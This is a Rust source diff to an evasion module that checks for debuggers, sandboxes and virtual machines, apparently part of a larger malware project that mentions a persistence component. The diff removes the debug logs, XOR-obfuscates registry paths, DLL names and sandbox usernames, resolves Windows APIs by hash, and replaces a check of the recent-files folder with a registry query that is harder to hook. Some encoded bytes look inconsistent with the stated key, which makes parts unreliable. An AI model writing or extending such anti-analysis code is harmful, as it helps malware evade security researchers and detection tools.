@@ -18,17 +18,14 @@ pub fn is_hostile_environment() -> bool {
     #[cfg(target_os = "windows")]
     {
         if is_debugger_present() {
-            debug!("Debugger detected");
             return true;
         }
         
         if is_sandbox() {
-            debug!("Sandbox detected");
             return true;
         }
         
         if is_low_resources() {
-            debug!("Low resources (VM?)");
             return true;
         }
     }
@@ -89,7 +86,9 @@ fn is_sandbox() -> bool {
         
         // Load advapi32
         if get_module_by_hash(HASH_ADVAPI32).is_none() {
-            let dll = b"advapi32.dll\0";
+            // advapi32.dll XOR 0x55
+            let dll_enc: [u8; 13] = [0x34, 0x31, 0x23, 0x34, 0x27, 0x3C, 0x66, 0x67, 0x7B, 0x31, 0x3B, 0x3B, 0x55];
+            let dll: Vec<u8> = dll_enc.iter().map(|b| b ^ 0x55).collect();
             if let Some(load_lib) = resolve_api::<unsafe extern "system" fn(*const u8) -> *const std::ffi::c_void>(
                 HASH_KERNEL32, HASH_LOAD_LIBRARY_A
             ) {
@@ -136,32 +135,109 @@ fn is_sandbox() -> bool {
         false
     }
     
+    // Simple XOR decode helper (Key: 0x55)
+    // Duplicated from persistence.rs to verify locally
+    fn x(bytes: &[u8]) -> String {
+        let key = 0x55;
+        let decoded: Vec<u8> = bytes.iter().map(|b| b ^ key).collect();
+        String::from_utf8(decoded).unwrap_or_default()
+    }
+
     // Method 1: Check for VM registry keys (Native API)
     unsafe {
-        if check_key_exists(r"SOFTWARE\VMware, Inc.\VMware Tools") { return true; }
-        if check_key_exists(r"SOFTWARE\Oracle\VirtualBox Guest Additions") { return true; }
-        if check_key_exists(r"SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters") { return true; }
+        // SOFTWARE\VMware, Inc.\VMware Tools
+        // S(53)^55=06...
+        let vm1 = x(&[
+            0x06, 0x1A, 0x13, 0x01, 0x02, 0x14, 0x07, 0x10, 0x0D, // SOFTWARE\
+            0x03, 0x18, 0x02, 0x34, 0x07, 0x30, 0x75, 0x75, 0x1C, 0x3B, 0x36, 0x73, 0x0D, // VMware, Inc.\
+            0x03, 0x18, 0x02, 0x34, 0x07, 0x30, 0x75, 0x01, 0x3A, 0x3A, 0x39, 0x06        // VMware Tools
+        ]);
+        
+        // SOFTWARE\Oracle\VirtualBox Guest Additions
+        let vm2 = x(&[
+             0x06, 0x1A, 0x13, 0x01, 0x02, 0x14, 0x07, 0x10, 0x0D, // SOFTWARE\
+             0x1A, 0x07, 0x34, 0x36, 0x39, 0x30, 0x0D,             // Oracle\
+             0x03, 0x3C, 0x07, 0x01, 0x00, 0x34, 0x39, 0x17, 0x3A, 0x0D, 0x75, // VirtualBox 
+             0x12, 0x00, 0x30, 0x06, 0x01, 0x75, 0x14, 0x31, 0x31, 0x3C, 0x01, 0x3C, 0x3A, 0x3B, 0x06 // Guest Additions
+        ]);
+        
+        // SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters
+        let vm3 = x(&[
+             0x06, 0x1A, 0x13, 0x01, 0x02, 0x14, 0x07, 0x10, 0x0D, // SOFTWARE\
+             0x18, 0x3C, 0x36, 0x07, 0x3A, 0x06, 0x3A, 0x33, 0x01, 0x0D, // Microsoft\
+             0x03, 0x3C, 0x07, 0x01, 0x00, 0x34, 0x39, 0x75, 0x18, 0x34, 0x36, 0x3D, 0x3C, 0x3B, 0x30, 0x0D, // Virtual Machine\
+             0x12, 0x00, 0x30, 0x06, 0x01, 0x0D, // Guest\
+             0x05, 0x34, 0x07, 0x34, 0x38, 0x30, 0x01, 0x30, 0x07, 0x06 // Parameters
+        ]);
+
+        if check_key_exists(&vm1) { return true; }
+        if check_key_exists(&vm2) { return true; }
+        if check_key_exists(&vm3) { return true; }
     }
     
     // Method 2: Check username/computername for sandbox patterns
     if let Ok(user) = std::env::var("USERNAME") {
         let user_lower = user.to_lowercase();
-        // REMOVED "admin" to match new logic
-        let sandbox_users = ["sandbox", "virus", "malware", "test", "sample", "john"]; 
+        
+        // Plaintext: "sandbox", "virus", "malware", "test", "sample", "john"
+        // Encoded (XOR 0x55):
+        let s1 = x(&[0x26, 0x34, 0x3B, 0x31, 0x37, 0x3A, 0x2D]); // sandbox
+        let s2 = x(&[0x23, 0x3C, 0x07, 0x00, 0x26]);             // virus
+        let s3 = x(&[0x38, 0x34, 0x39, 0x22, 0x34, 0x07, 0x30]); // malware
+        let s4 = x(&[0x21, 0x30, 0x26, 0x21]);                   // test
+        let s5 = x(&[0x26, 0x34, 0x38, 0x25, 0x39, 0x30]);       // sample
+        let s6 = x(&[0x3F, 0x3A, 0x3D, 0x3B]);                   // john
+        
+        let sandbox_users = [s1, s2, s3, s4, s5, s6]; 
         for s in sandbox_users {
-            if user_lower.contains(s) {
+            if user_lower.contains(&s) {
                 return true;
             }
         }
     }
     
     // Method 3: Check recent files (sandboxes often have none)
-    let appdata = std::env::var("APPDATA").unwrap_or_default();
-    let recent_path = format!("{}\\Microsoft\\Windows\\Recent", appdata);
-    if let Ok(entries) = std::fs::read_dir(&recent_path) {
-        let count = entries.count();
-        if count < 5 {
-            return true;
+    // REPLACED std::fs::read_dir with registry-based check (less hookable)
+    // Check if RecentDocs registry key has entries
+    unsafe {
+        use super::api_resolver::*;
+        
+        if let Some(advapi32) = get_module_by_hash(HASH_ADVAPI32) {
+            type RegOpenKeyExW = unsafe extern "system" fn(isize, *const u16, u32, u32, *mut isize) -> i32;
+            type RegQueryInfoKeyW = unsafe extern "system" fn(
+                isize, *mut u16, *mut u32, *mut u32, *mut u32, *mut u32, 
+                *mut u32, *mut u32, *mut u32, *mut u32, *mut u32, *mut u64
+            ) -> i32;
+            type RegCloseKey = unsafe extern "system" fn(isize) -> i32;
+            
+            if let (Some(reg_open), Some(reg_query), Some(reg_close)) = (
+                get_export_by_hash(advapi32, 0x9139725C).map(|p| std::mem::transmute::<_, RegOpenKeyExW>(p)),
+                get_export_by_hash(advapi32, 0x3A8D26FE).map(|p| std::mem::transmute::<_, RegQueryInfoKeyW>(p)), // RegQueryInfoKeyW
+                get_export_by_hash(advapi32, 0x66579AD4).map(|p| std::mem::transmute::<_, RegCloseKey>(p)),
+            ) {
+                // HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
+                let path: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs"
+                    .encode_utf16().chain(std::iter::once(0)).collect();
+                
+                let hkcu = 0x80000001u32 as isize;
+                let mut hkey: isize = 0;
+                
+                if reg_open(hkcu, path.as_ptr(), 0, 0x20019, &mut hkey) == 0 {
+                    let mut num_values: u32 = 0;
+                    // Query number of values in key
+                    if reg_query(hkey, std::ptr::null_mut(), std::ptr::null_mut(), 
+                                 std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null_mut(),
+                                 std::ptr::null_mut(), &mut num_values, std::ptr::null_mut(),
+                                 std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null_mut()) == 0 {
+                        reg_close(hkey);
+                        if num_values < 5 {
+                            return true; // Sandbox detected
+                        }
+                    } else {
+                        reg_close(hkey);
+                    }
+                }
+            }
         }
     }
     
